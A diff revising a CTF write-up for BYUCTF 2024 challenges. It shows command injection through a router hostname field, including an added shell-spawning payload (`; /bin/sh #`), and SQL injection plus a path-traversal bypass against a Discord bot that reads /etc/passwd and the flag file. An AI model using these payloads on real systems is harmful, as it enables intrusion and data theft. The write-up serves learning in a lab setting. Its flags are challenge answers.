@@ -26,7 +26,7 @@ tags: CTF, ByuCTF, Misc, IoT, CyberSecurity
 Thanks ByuCTF Team for this CTF! 
 I personally prefered the last edition, but this one was cool too.
 
-It was cool to see IoT category, but pentesting miss me...
+It was awesome to see IoT category, but pentesting miss me...
 
 ByuCTF 2023 Official WriteUp : https://github.com/BYU-CSA/BYUCTF-2024-Public
 
@@ -76,7 +76,7 @@ We download the source code from the attachments and start to analyze the code.
 
 There is two code needed to solve this challenge. 
 
-The first is the `Dockerfile`to understand how the challenge is setup in the `netcat` server. The second is `server.py` to know how the router work.
+The first is the `Dockerfile` to understand how the challenge is setup in the `netcat` server. The second is `server.py` to know how the router work.
 
 
 #### Code analyze - Dockerfile
@@ -115,13 +115,13 @@ CMD ["bash", "/ctf/start.sh"]
 EXPOSE 40000
 ```
 
-From there, we learn that the `flag.txt`file is copied inside the `/ctf`folder. 
+From there, we learn that the `flag.txt` file is copied inside the `/ctf` folder. 
 
 ```bash
 COPY flag.txt /ctf
 ```
 
-And then many folder are created from the root of the server, but apparently we dont know their names.
+And then some folder are created recursively from the root of the server, but apparently we dont know their names.
 
 ```bash
 RUN mkdir -p /on/the/server/this/path/is/different/
@@ -166,7 +166,7 @@ while True:
         print('Invalid choice')
 ```
 
-We can see that we have two choice, the first is to enter a new hostname with maximum 30 characters, which is then saved inside the `hostname`variable : 
+We can see that we have two choice, the first is to enter a new hostname with maximum 30 characters, it is then saved inside the `hostname` variable : 
 
 ```python
 hostname = 'bababooey'
@@ -179,7 +179,7 @@ hostname = 'bababooey'
 
 The second is to reboot.
 
-Looking at what happen when the router reboot and we see that a command is executed using `os.system`. The command run `cat` to read `/etc/hosts` file, and then use `grep` to take the `hostname`variable value with the `-i`parameter meaning `--ignore-case`used to "ignore case distinctions in patterns and data".
+Looking at what happen when the router reboot and we see that a command is executed using `os.system`. The command run `cat` to read `/etc/hosts` file, and then use `grep` to take the `hostname` variable value with the `-i` parameter used to "ignore case distinctions in patterns and data".
 
 ```python
     elif choice == '2':
@@ -192,9 +192,9 @@ Looking at what happen when the router reboot and we see that a command is execu
 
 Here is how i failed, and then how i solved the challenge.
 
-We understand that we can inject commands in the hostname filed by escaping the `cat /etc/hosts | grep` field, by piping it or using semicolon or other similiar way.
+We understand that we can inject commands in the hostname filed by escaping the `cat /etc/hosts | grep` field, by piping it, using semicolon or other similiar way.
 
-We found how exploit it, now it's time to enumerate and retrieve the flag.
+We found how to exploit it, now it's time to enumerate and retrieve the flag.
 
 #### Exploitation - Enumerate and Fail
 
@@ -243,11 +243,11 @@ var
 Reboot complete
 ```
 
-From there, all folder seem normal, excepted `ctf`and `ohno`. We know that our flag is not inside `ctf`so it should be inside `ohno` and many folder behind this.
+From there, all folder seem normal, excepted `ctf` and `ohno`. We know that our flag is not inside `ctf` so `ohno` is our starting path for the flag.
 
 Time to fail :)
 
-I badly started to list folder inside `ohno`and so on... and i came at this point.
+I badly started to list folder inside `ohno` and so on... and i came at this point.
 
 Final command used (due to 30 chars restriction) : `| ls /ohno/i/hope/this/isnt/ #` 
 
@@ -270,7 +270,9 @@ Try 'grep --help' for more information.
 Reboot complete
 ```
 
-But... remember? Maximum 30 characters allowed in the hostname... Note that the folder path are saying "oh no i hope this isnt too", too what... too long?? Huh??? Thanks to the creator to make us cry.
+But... remember? Maximum 30 characters allowed as hostname... 
+
+Note that the folder path are saying "oh no i hope this isnt too", too what... too long?? Huh??? Thanks to the creator to make us cry.
 
 SO I USED MY LEET POWER TO...... fail again. Yeah...
 
@@ -301,13 +303,13 @@ Yeah... Again too much characters. Look at that "lol" folder which is totally la
 
 The creator was literally SURE, that we will do this! Also, can you imagine the time consumed for nothing? One folder = one reboot! But i laughed a lot! That's funny!
 
-Well. Time be smarter!
+Well. Time to be smarter!
 
 #### Exploitation - Flag it!
 
-At this moment, i asked myself "How can i list every folder which is inside `ohno`, and read every files in them (pretty sure there is only the flag at the end), at one go?".
+At this moment, i asked myself "How can i list every folder which is inside `ohno`, and read every files in these (pretty sure there is only the flag at the end), at one go?".
 
-So i used `find`, to list all the folder and the parameter `-exec`combined to `cat` to read all files inside these, and the magic happen!
+So i used `find`, to list all the folder and the parameter `-exec` combined with `cat` to read all files inside these, and the magic happen!
 
 Final Command used : `| find /oh* -exec cat {} + #`
 
@@ -348,9 +350,58 @@ byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}
 Reboot complete
 ```
 
-Finally! One Shot! But something like 45minutes in failure è_é. Be smarter!
+Finally! One Shot! But something like 45minutes spend in failure è_é. Be smarter!
 
 The final full path is : `/ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun`
+
+There is a lot of way to get the flag, we can escape and call a shell too (i didn't tried this because i was thinking that there was some protection... i was wrong):
+
+Command used : `; /bin/sh #`
+
+```bash
+=== MENU ===
+1. Set hostname
+2. Reboot
+
+Choice: 1
+Enter new hostname (30 chars max): ; /bin/sh #
+=== MENU ===
+1. Set hostname
+2. Reboot
+
+Choice: 2
+Rebooting...
+Usage: grep [OPTION]... PATTERNS [FILE]...
+Try 'grep --help' for more information.
+whoami
+ctf
+cat /ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun/*
+byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}
+```
+
+Or abuse of the grep command and use parameter, thats so smart! 
+
+Command used : `-r "byuctf*" /ohno #`
+Or : `-r "{" /ohno #`
+
+```bash
+=== MENU ===
+1. Set hostname
+2. Reboot
+
+Choice: 1 
+Enter new hostname (30 chars max): -r "byuctf*" /ohno #
+=== MENU ===
+1. Set hostname
+2. Reboot
+
+Choice: 2
+Rebooting...
+/ohno/i/hope/this/isnt/too/long/is/this/messing/you/up/lol/arent/ctfs/so/much/fun/bec88d76f73adcb8b5fae122baae0bc5:byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}
+Reboot complete
+```
+
+And many other way...
 
 Flag : **byuctf{expl0iting_th1s_r3al_w0rld_w4s_s000_ann0ying}**
 
@@ -376,7 +427,7 @@ Author:  **TheITFirefly**
 
 This is an easy challenge to start the CTF. 
 
-Going to the `gitlab`repository, we directly look at the commit history.
+Going to the `gitlab` repository, we directly look at the commit history.
 
 From there, we found a commit that jump to our eyes which is named "Fix accidental tracking of dynamically created resources".
 
@@ -384,7 +435,7 @@ From there, we found a commit that jump to our eyes which is named "Fix accident
 	<img src="assets/img/misc/Gitting-Started/1-commit.png">
 </p>
 
-Opening that commit and looking at the code change reveal the flag.
+Opening that commit and looking at the code modifications reveal the flag.
 
 <p align="center">
 	<img src="assets/img/misc/Gitting-Started/2-flag.png">
@@ -413,7 +464,7 @@ Author:  **deltabluejay**
 
 The description don't show anything excepted a discord link to join the server `Porg City`, so let's join it.
 
-Once `Porg City`discord server joined, we can see the message bellow inside the `#Welcome` canal.
+Once `Porg City` discord server joined, we can see the message bellow inside the `#Welcome` canal.
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/1-Welcome.png">
@@ -425,7 +476,7 @@ Next, going to `#porg-plaza` canal show us some "useless" message, but also the 
 	<img src="assets/img/misc/Porg-City/2-Find_bot.png">
 </p>
 
-As we doesn't have write permissions in the canal, we need to use the bot using direct message.
+As we doesn't have write permissions in the canal, we need to use the bot by direct message.
 
 Looking at the Bot profile description, and we can see that we can use it using the command `@Porg Bot helpme`.
 
@@ -433,7 +484,7 @@ Looking at the Bot profile description, and we can see that we can use it using 
 	<img src="assets/img/misc/Porg-City/3-Bot.png">
 </p>
 
-Using this command, we are able to see what kind of command we can executed. We can "Find our porg friend" (we don't understand yet the purpose), and also "Get it's source code".
+Using this command, we are able to see what kind of command we can execute. We can "Find our porg friend" (we don't understand yet the purpose), and also "Get it's source code".
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/4-Bot-help.png">
@@ -472,7 +523,7 @@ $ tree
 │       └── porgs.db
 ```
 
-We have the Dockerfile, which is used to setup the challenge. A images folders with various "porgs" images. A folder source, with a fake flag, the main source code, and the porgs database.
+We have the `Dockerfile`, which is used to setup the challenge. An `images` folders with various "porgs" images. A folder `src`, with a fake flag `flag.txt`, the main source code `main.py`, and the porgs database `porgs.db`.
 
 First, let's review the Dockerfile.
 
@@ -499,7 +550,7 @@ USER ctf
 CMD [ "python", "main.py" ]
 ```
 
-From the Dockerfile, we can see how it's setting up inside the target server.
+From the Dockerfile, we can see how the challenge is setup in the target server.
 
 The images are copied from the `images` folder to `/srv/images`
 
@@ -507,7 +558,9 @@ The images are copied from the `images` folder to `/srv/images`
 COPY images /srv/images
 ```
 
-Then it create an environment variable called `RANDOM_DIR` with a value randomized. It set as workdir the path `/usr/src/app/$RANDOM_DIR` and copy the content of `src` inside it. 
+Then it create an environment variable called `RANDOM_DIR` with a value randomized. 
+
+It set as workdir the path `/usr/src/app/$RANDOM_DIR` and copy the content of `src` inside it. 
 
 ```bash
 ENV RANDOM_DIR this_is_randomized_in_production
@@ -515,9 +568,9 @@ WORKDIR /usr/src/app/$RANDOM_DIR
 COPY src .
 ```
 
-Then it add an user `ctf`and give the correct permission to the user and folders.
+Then it add an user `ctf` and give the correct permission to the user and folders.
 
-In fact, this mean that we don't know the exact path of the `flag.txt` file, as it should be inside the `src` (as seen in the code tree), and is copied to `/usr/src/app/$RANDOM_DIR/flag.txt` and we don't know the `$RANDOM_DIR` environment variable value.
+In fact, this mean that we don't know the exact path of the `flag.txt` file, as it's copied from `src` (as seen in the code tree), to `/usr/src/app/$RANDOM_DIR/flag.txt` and we don't know the `$RANDOM_DIR` environment variable value.
 
 Now let's analyze the `main.py` code.
 
@@ -649,7 +702,9 @@ async def porg(ctx, *, name: str):
     await ctx.send(embed=display)
 ```
 
-In this part of the code, we can see that when we supply a "porg" name, an SQL query is executed to fetch the data inside the database. And as we can see, we should be able to exploit an SQL injection, in the name field.
+In this part of the code, we can see that when we supply a "porg" name using the bot `@Porg Bot porg name_here`, an SQL query is executed to fetch the data inside the database. 
+
+And as we can see, we should be able to exploit an SQL injection, in the `name` field.
 
 ```python
     query = f"SELECT * FROM porgs WHERE name LIKE '{name}'"
@@ -658,7 +713,7 @@ In this part of the code, we can see that when we supply a "porg" name, an SQL q
         results = cursor.fetchall()
 ```
 
-We can see that if there is an exception an error happen, but unforunatly, the bot don't show the error because there is no `await` before the `ctx.send`()
+We can see that if there is an exception an error happen, but unforunatly, the bot don't show the error as there is no `await` before the `ctx.send` command.
 
 ```python
     except Exception as e:
@@ -666,7 +721,7 @@ We can see that if there is an exception an error happen, but unforunatly, the b
         return
 ```
 
-If the name isn't inside the database, the bot reply with a message saying that the "porg is not found". And this time the bot reply because the `await` is present.
+If the name isn't inside the database, the bot reply with a message saying that the "porg is not found". And this time the bot would reply as the `await` command is present.
 
 ```python
     if len(results) == 0:
@@ -674,7 +729,7 @@ If the name isn't inside the database, the bot reply with a message saying that 
         return
 ```
 
-We can see that there is a mitigation against LFI inside the image data column.
+We can see that there is a mitigation against LFI inside the image data column, so if we try to go to a previous path using `../` we would trigger the `Nope!` message from the bot.
 
 ```python
     if ('..' in porg.image):
@@ -682,7 +737,7 @@ We can see that there is a mitigation against LFI inside the image data column.
         return
 ```
 
-Finally, we can see how the bot display inforations from the database.
+Finally, we can see how the bot display informations fetch from the database.
 
 ```python
     img = disnake.File(os.path.join('/srv/images/', porg.image))
@@ -695,13 +750,13 @@ Finally, we can see how the bot display inforations from the database.
     await ctx.send(embed=display)
 ```
 
-The thing interesting in it is about `porg.image`. The following line give the default path `/srv/images/` using `os.path.join` of the images.
+The interesting part in it is about `porg.image`. The following line give the default path `/srv/images/` using `os.path.join` of the images.
 
 ```python
     img = disnake.File(os.path.join('/srv/images/', porg.image))
 ```
 
-And the following line set the image as a file. 
+And the following line set the image as file. 
 
 ```python
     display.set_image(file=img)
@@ -715,9 +770,9 @@ And then it display all that data as embed data.
 
 This is really interesting because if we can manage to make an SQL injection inside the query, and then manipulate the data displayed. We may be able to select the flag file instead of an image.
 
-But we will have two main problem, the first is the local file inclusion mitigation, we will need to find a way to bypass.
+But we will have two main problem, the first is the local file inclusion mitigation, we will need to find a way to bypass it.
 
-The second is that we don't know where the flag is as we seen in the Dockerfile code. 
+The second is that we don't know where the flag is as we seen in the `Dockerfile` code. 
 
 Now let's analyze the database.
 
@@ -753,7 +808,7 @@ Bill
 redbill.webp
 ```
 
-Now for a better understanding of this, i used "SQLite Database Browser", where i go inside the "Execute SQL" tab to send a Query to show all the data inside the `porgs` table.
+Now for a better understanding of this, i used "SQLite Database Browser", where i used the "Execute SQL" tab to send a Query and show all the data inside the `porgs` table.
 
 Query : `SELECT * FROM porgs;`
 
@@ -761,13 +816,19 @@ Query : `SELECT * FROM porgs;`
 	<img src="assets/img/misc/Porg-City/sqlite_porgs.png">
 </p>
 
-From there we are able to see clearly whats the data. Now let's move on.
+From there we are able to see clearly whats the column entry. 
+
+Now let's move on.
 
 #### Exploitation - SQL Injection
 
-Now that we have analyzed the code, let's see how the `@Porg Bot porg name`bot command work. We will took a name value of the `porgs.db` as value.
+Now that we analyzed the code, let's see how the `@Porg Bot porg name` bot command work. 
+
+We will took a name value of the `porgs.db` as value, and send an intended query.
 
 Query : `@Porg Bot porg Joe`
+
+Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE 'Joe'`
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/6-Bot-porg.png">
@@ -778,15 +839,17 @@ Great! Now As we seen in the `main.py` code, we should be able to exploit an SQL
 Let's try a basic injection using a quote and see what we got.
 
 Query : `@Porg Bot porg '`
+
 Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE ''`
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/Bot-sqli_fail.png">
 </p>
 
-Hum, no answer from the bot, as the quote should make an error, and that we cannot see the error (as we seen in source code analyse), let's try to make a query a bit more advanced which should reply a result.
+Hum, no answer from the bot, as the quote should make an error, and that we cannot see the error (as we seen in source code analyse), let's try to make a query a bit more advanced which should be executed correctly and return a result.
 
 Query : `@Porg Bot porg ' OR 1=1 --`
+
 Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE '' OR 1=1 --`
 
 <p align="center">
@@ -796,19 +859,22 @@ Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE '' OR 1=1 -
 Perfect! Here is another try i used using the `%` character which is interpreted as a wildcard inside the `name` field.
 
 Query : `@Porg Bot porg %`
+
 Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE '%'`
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/8-Bot-sqli_2.png">
 </p>
 
-Now let's find a way to manipulate the data.
+Now let's find a way to manipulate the retrieved data.
 
 #### Exploitation - SQL Injection, Data Manipulation
 
-The following query is a lot over looked, i ended with it because initially i was trying to create a row on the database to call my row after that. As i'm not really good with SQL, i was learning while doing the challenge. But at the end, it didn't worked as i was intending to work. But for the Write Up i want to include all of my various different query.
+The following query is a lot over looked, i ended with it because initially i was trying to create a row on the database to call my row after that. 
 
-I Used `UNION ALL` operator to combine two statement, with my pseudo as `name` ,`NULL AS` value  as `age`, `fav_color`, and finally an existing image `bill.webp` as `img`, to initially create a row and be sure to return it at one go using `WHERE NOT EXISTS` with my second statement (this part is the useless one).
+As i'm not really good with SQL, i was learning while doing the challenge. But at the end, it didn't worked as i expected it to work. But for the Write Up i want to include all of my different query used.
+
+I Used `UNION ALL` operator to combine two statement, with my pseudo as `name` ,`NULL` value as `id`, `age`, `fav_color`, and finally an existing image `bill.webp` as `img` to initially create a row and be sure to return it at one go using `WHERE NOT EXISTS` with my second statement (this part is the useless one).
 
 Query : `@Porg Bot porg v0lk3n' UNION ALL SELECT NULL AS id, 'v0lk3n' AS name, NULL AS age, NULL AS fav_color, 'bill.webp' AS img WHERE NOT EXISTS (SELECT 1 FROM porgs WHERE name = 'v0lk3n') --`
 
@@ -818,16 +884,17 @@ Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE 'v0lk3n' UN
 	<img src="assets/img/misc/Porg-City/9-Bot-sqli_manipulation.png">
 </p>
 
-As i said, this query is too much for nothing. So i've found another way a lot smaller than this. Once again using  `UNION`operator, and directly supply our data for the collumn in the right order.
+As i said, this query is too much, with useless operations. So i've found another way a lot smaller than this. Once again using `UNION` operator, and directly provide our data for the collumn in the right order.
 
 Query : `@Porg Bot porg ' UNION SELECT NULL, 'v0lk3n', 42, 'whitehat', 'bill.webp' --`
+
 Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE '' UNION SELECT NULL, 'v0lk3n', 42, 'whitehat', 'bill.webp' --`
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/sqli_manipulation-smaller.png">
 </p>
 
-Great! Now we need to find a way to manipulate the data of `img` to include our flag at this place. But for this, we will need to find a way to bypass the mitigation of the file inclusion in this space.
+Great! Now we need to find a way to manipulate the data of `img` to include our flag at this place. But for this to work, we will need to find a way to bypass the mitigation of the file inclusion.
 
 #### Exploitation - SQL Injection, Bypass Mitigation
 
@@ -839,7 +906,7 @@ As we seen in the Source Analyse, there is a Mitigation that disallow `..` insid
         return
 ```
 
-I've found two bypass for this. The more easier and intended was to supply the full path. Because `os.path.join` will not count the first path when a second is used.
+I've found two bypass for this. The more easier and intended was to supply the full path. Because `os.path.join` will not count the first path when a second path is provided.
 
 ```python
     img = disnake.File(os.path.join('/srv/images/', porg.image))
@@ -849,30 +916,35 @@ In fact, if i supply `/full/path/tofile.txt` it will become `/srv/images//full/p
 
 Bypass : `/full/path/tofile.txt`
 
-The second is again "useless", because i guess it's interpreted exactly as the same way. But i used the following one.
+The second is "overlooked", which is the following one.
 
 Bypass : `/./full/path/././tofile.txt`
+
+There is a tons of possibility to bypass LFI mitigation like this one, but as we can provide the full path, this isntt needed at all.
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/10-Bot-sqli_bypass_lfi.png">
 </p>
 
-Now that we manipulated all the data with success, we can try to combine SQL Injection with Local File Inclusion to retrieve a file present on the server.
+Now that we manipulated all the data with success, we can try to chain the SQL Injection with Local File Inclusion to make the bot display a file present in the server.
 
 #### Exploitation - SQL Injection and Local File Inclusion
 
-Note : While the CTF was running, i reached this point. I didn't find the way to retrieve the data unfortunately as i was using the Discord app instead of the browser, and i didn't thinking about this. Sadly, apparently the data should be returned directly as intended. But discord send a patch few days before the CTF which made the thing harder. (Anyway, i'm not sure i would find the way to find the flag, but i've retrieved `/etc/passwd` file with success, without seeing it...)
+Note : While the CTF was running, i reached this point. I didn't find the way to retrieve the data unfortunately as i was using the Discord app instead of the browser version, and i didn't thinking about this. 
+
+Sadly, apparently the data should be returned directly as intended. But discord send a patch few days before the CTF which made the thing harder. (Anyway, i'm not sure i would find the way for the flag path, but i've retrieved `/etc/passwd` file with success, without seeing it...)
 
 Let's start by attempting to retrieve `/etc/passwd` file.
 
 Query : `@Porg Bot porg ' UNION SELECT NULL, 'v0lk3n', 42, 'whitehat', '/etc/passwd' --`
+
 Full Query in the server side : `SELECT * FROM porgs WHERE name LIKE '' UNION SELECT NULL, 'v0lk3n', 42, 'whitehat', '/etc/passwd' --`
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/11-Bot-sqli_passwd.png">
 </p>
 
-The bot reply, with empty data for the image field. We need to use the Dev Tools of our browser and look at the network tab and refresh the page then look for the data.
+The bot reply, with empty data for the image field. We need to use the Dev Tools of our browser and look at the network tab and refresh the page to look for the data.
 
 The data can be found on the file `messages?limite=50` inside the objects of the `Response` tab.
 
@@ -884,7 +956,9 @@ The data can be found on the file `messages?limite=50` inside the objects of the
 	<img src="assets/img/misc/Porg-City/13-DevTools-object_passwd.png">
 </p>
 
-Looking at the object of the bot answer, we can find the `Embeds` data, where we can found a cdn discord link containing the file. Open that link to download the `/etc/passwd` file and retrieve it's content.
+Looking at the object of the bot answer, we can find the `Embeds` data, where we can found an `url` with a cdn discord link pointing to the attachments file. 
+
+Open that link to download the `/etc/passwd` file and retrieve it's content.
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/14-DevTools-link_passwd.png">
@@ -912,13 +986,15 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 ctf:x:1000:1000::/home/ctf:/bin/sh
 ```
 
-Perfect! Now to retrieve the `flag.txt`, we need to repeat this process, but we need to know it's path location. And as it's randomized, we don't know it, we need to find a work around. 
+Perfect! Now to retrieve the `flag.txt`, we need to repeat this process, but we need to know it's path location. 
 
-A way to do this is to go inside the `/proc/self/cwd` folder, which is used as python workdir. By this way, the flag will be found inside `/proc/self/cwd/flag.txt`without needing to find the real path. 
+As it's randomized, we don't know it, so we need to find a work around. 
+
+A way to do this is to go inside the `/proc/self/cwd` folder, which is used as python workdir for the running app. By this way, the flag will be found inside `/proc/self/cwd/flag.txt` without needing to find the real path. 
 
 For more information, take a look at the `procfs` documentation.
 
-Procfs documentation : https://man7.org/linux/man-pages/man5/procfs.5.html
+Procfs documentation : [https://man7.org/linux/man-pages/man5/procfs.5.html](https://man7.org/linux/man-pages/man5/procfs.5.html)
 
 Query : `@Porg Bot porg ' UNION SELECT NULL, 'v0lk3n', 42, 'whitehat', '/proc/self/cwd/flag.txt' --`
 
@@ -948,13 +1024,13 @@ Open the Discord CDN link and we retrieve the flag!
 
 Official WriteUp : https://github.com/BYU-CSA/BYUCTF-2024-Public/tree/main/misc/porg-city
 
-And bellow, how it should be as intended before the discord patch (screenshot taken from the official WriteUp)
+And bellow, how it should be solved as intended before the discord patch (screenshot taken from the official WriteUp)
 
 <p align="center">
 	<img src="assets/img/misc/Porg-City/intended.png">
 </p>
 
-**Flag : `byuctf{hehehe_hASWHHyrc9_https://i.imgflip.com/8l27ka.jpg}`**
+**Flag : byuctf{hehehe_hASWHHyrc9_https://i.imgflip.com/8l27ka.jpg}**
 
 #### Try Harder!
 
